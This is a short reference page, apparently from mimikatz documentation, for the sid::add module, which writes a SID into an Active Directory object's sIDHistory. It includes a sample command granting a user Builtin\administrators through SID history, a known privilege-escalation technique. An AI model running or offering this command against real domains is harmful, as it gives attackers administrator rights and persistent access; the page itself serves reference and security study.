# add

This module can be used to add a SID to `sIDHistory` of an object. It has the following command line argument:

* `/sam`: the `sAMAccountName`.
* `/new`: the new SID value. It also accepts format such as `Builtin\administrators`.

```text
mimikatz # sid::add /sam:username /new:Builtin\administrators
```

